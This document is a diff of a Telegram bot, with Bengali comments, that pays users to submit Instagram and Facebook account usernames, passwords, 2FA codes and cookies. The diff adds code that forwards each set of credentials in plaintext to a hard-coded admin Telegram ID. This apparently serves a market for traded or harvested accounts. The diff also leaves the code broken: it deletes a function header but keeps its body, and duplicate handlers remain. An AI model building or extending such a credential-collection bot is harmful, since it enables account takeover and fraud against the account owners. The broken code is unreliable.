@@ -48,14 +48,10 @@ class BotState(StatesGroup):
     waiting_for_address = State()
     waiting_for_withdraw_amount = State()
     waiting_for_add_money = State()
-    waiting_for_add_money = State()
-    # নিচে এই ৩টি লাইন লিখে দিন
     waiting_for_username = State()
     waiting_for_password = State()
     waiting_for_2fa = State()
     waiting_for_block_reason = State()
-    waiting_for_single_id = State()
-async def is_blocked(user_id):
     cursor.execute("SELECT user_id FROM blacklist WHERE user_id=?", (user_id,))
     return cursor.fetchone() is not None
 
@@ -138,40 +134,14 @@ async def work_start(message: types.Message):
     msg = "👍 যেকোনো সমস্যায়: @Dinanhaji !\n🔴 আপনার কাজের ক্যাটাগরি বেছে নিন:"
     await message.answer(msg, reply_markup=inline_kb)
     
-@dp.callback_query_handler(lambda c: c.data.startswith('type_'))
-async def process_callback_work_type(callback_query: types.CallbackQuery):
-    data = callback_query.data
-    category_map = {
-        "type_ig_mother": "IG Mother Account",
-        "type_ig_2fa": "IG 2fa",
-        "type_fb_2fa": "FB 0fnd 2fa",
-        "type_ig_cookies": "IG Cookies"
-    }
-    selected_category = category_map.get(data, "Unknown")
-    
-    # দুটি অপশন দেখানো: File এবং Single ID
-    inline_kb = types.InlineKeyboardMarkup(row_width=2)
-    inline_kb.add(
-        types.InlineKeyboardButton("📁 File", callback_data="ask_for_file"),
-        types.InlineKeyboardButton("👤 Single ID", callback_data="ask_for_single")
-    )
-    
-    await bot.answer_callback_query(callback_query.id)
-    await bot.send_message(
-        callback_query.from_user.id, 
-        f"✅ আপনি **{selected_category}** সিলেক্ট করেছেন।\nকাজের ধরন বেছে নিন:", 
-        reply_markup=inline_kb
-    )
-
-# --- File বাটনের রেসপন্স
-# --- File বাটনের রেসপন্স ---
+# --- ১. ফাইল বাটনের রেসপন্স ---
 @dp.callback_query_handler(lambda c: c.data == 'ask_for_file')
 async def ask_for_file_handler(callback_query: types.CallbackQuery):
     await bot.answer_callback_query(callback_query.id)
     await bot.send_message(callback_query.from_user.id, "📤 আপনার এক্সেল ফাইলটি পাঠান:")
     await BotState.waiting_for_file.set()
 
-# --- Single ID বাটনে ক্লিক করলে ইউজারনেম চাওয়া ---
+# --- ২. সিঙ্গেল আইডি বাটনে ক্লিক করলে ইউজারনেম চাওয়া ---
 @dp.callback_query_handler(lambda c: c.data == 'ask_for_single')
 async def ask_for_single_handler(callback_query: types.CallbackQuery):
     await bot.answer_callback_query(callback_query.id)
@@ -192,7 +162,7 @@ async def get_pass(message: types.Message, state: FSMContext):
     await message.answer("🔐 এবার আপনার **টু-এফএ (2FA Code)** দিন:")
     await BotState.waiting_for_2fa.set()
 
-# --- ধাপ ৩: ২এফএ রিসিভ করে সব তথ্য দেখানো ---
+# --- ধাপ ৩: ২এফএ রিসিভ করে সব তথ্য সেভ করা ---
 @dp.message_handler(state=BotState.waiting_for_2fa)
 async def get_2fa(message: types.Message, state: FSMContext):
     data = await state.get_data()
@@ -208,40 +178,17 @@ async def get_2fa(message: types.Message, state: FSMContext):
         "এডমিন চেক করে আপনার ব্যালেন্স আপডেট করে দিবে।"
     )
     await message.answer(final_text, parse_mode="Markdown")
+    
+    # অ্যাডমিনকে তথ্য পাঠানো (আপনার আইডি এখানে বসান)
+    admin_id = 7041793774 # উদাহরণস্বরূপ
+    admin_msg = f"📩 **নতুন সিঙ্গেল আইডি:**\nইউজার: {message.from_user.id}\nUser: {username}\nPass: {password}\n2FA: {two_fa}"
+    try:
+        await bot.send_message(admin_id, admin_msg)
+    except Exception as e:
+        print(f"Error sending to admin: {e}")
+
     await state.finish()
     
-
-# --- ১. ইউজারনেম রিসিভ করে পাসওয়ার্ড চাওয়া ---
-@dp.message_handler(state=BotState.waiting_for_username)
-async def get_id(message: types.Message, state: FSMContext):
-    await state.update_data(u_id=message.text)
-    await message.answer("🔑 এবার আপনার **Password** দিন:")
-    await BotState.waiting_for_password.set()
-
-# --- ২. পাসওয়ার্ড রিসিভ করে টু-এফএ চাওয়া ---
-@dp.message_handler(state=BotState.waiting_for_password)
-async def get_pass(message: types.Message, state: FSMContext):
-    await state.update_data(u_pass=message.text)
-    await message.answer("🔐 এবার আপনার **টু-এফএ (2FA Code)** দিন:")
-    await BotState.waiting_for_2fa.set()
-
-# --- ৩. টু-এফএ রিসিভ করে সব তথ্য একসাথে দেখানো ---
-@dp.message_handler(state=BotState.waiting_for_2fa)
-async def get_2fa(message: types.Message, state: FSMContext):
-    data = await state.get_data()
-    username = data.get('u_id')
-    password = data.get('u_pass')
-    two_fa = message.text
-    
-    final_text = (
-        "✅ **আপনার তথ্য জমা হয়েছে!**\n\n"
-        f"👤 User: `{username}`\n"
-        f"🔑 Pass: `{password}`\n"
-        f"🔐 2FA: `{two_fa}`\n\n"
-        "এডমিন চেক করে আপনার ব্যালেন্স আপডেট করে দিবে।"
-    )
-    await message.answer(final_text, parse_mode="Markdown")
-    await state.finish()
     
 @dp.callback_query_handler(lambda c: c.data == 'ask_for_file')
 async def ask_for_file_handler(callback_query: types.CallbackQuery):
